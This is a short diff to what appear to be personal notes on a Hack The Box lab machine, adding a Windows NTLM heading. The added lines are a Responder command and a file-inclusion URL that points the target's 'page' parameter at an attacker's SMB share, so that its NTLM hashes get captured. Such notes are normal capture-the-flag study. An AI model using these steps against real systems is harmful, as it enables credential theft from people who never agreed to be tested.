@@ -44,6 +44,12 @@ Include PHP :
 https://www.php.net/manual/en/function.include.php
 
 
+Windows New Technology LAN Manager
+ 
+sudo responder -I tun0
+http://unika.htb/index.php?page=//10.10.14.3/somefile
+
+
 
 
 
